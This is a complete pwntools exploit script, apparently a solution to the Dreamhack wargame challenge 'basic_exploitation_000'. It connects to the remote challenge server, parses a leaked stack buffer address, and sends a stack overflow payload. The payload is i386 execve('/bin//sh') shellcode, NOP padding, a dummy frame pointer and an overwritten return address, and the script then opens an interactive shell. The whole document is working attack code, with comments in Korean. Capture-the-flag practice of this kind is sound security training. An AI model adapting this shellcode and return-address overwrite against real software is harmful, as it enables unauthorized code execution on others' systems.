from pwn import *

# p = process('./basic_exploitation_000') # 로컬 테스트용
p = remote('host8.dreamhack.games', 22649) # 실제 포트로 변경

context.log_level = 'debug'
context.arch = 'i386'

# 1. 버퍼 주소 획득
p.recvuntil(b"buf = (")
buf_addr = int(p.recvuntil(b")", drop=True), 16)
log.info(f"Leaked Buffer Address: {hex(buf_addr)}")

# 2. 셸코드
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# 3. 페이로드 구성 (수정된 부분)
# 구조: [Shellcode] + [NOP Padding] + [SFP Dummy] + [Return Address]
payload = shellcode
payload += b"\x90" * (132 - len(shellcode)) # 버퍼(128) + 정렬패딩(4) 채움
payload += b"BBBB"                        # SFP(4) 덮어씀
payload += p32(buf_addr)                  # RET 덮어씀

p.sendline(payload)
p.interactive()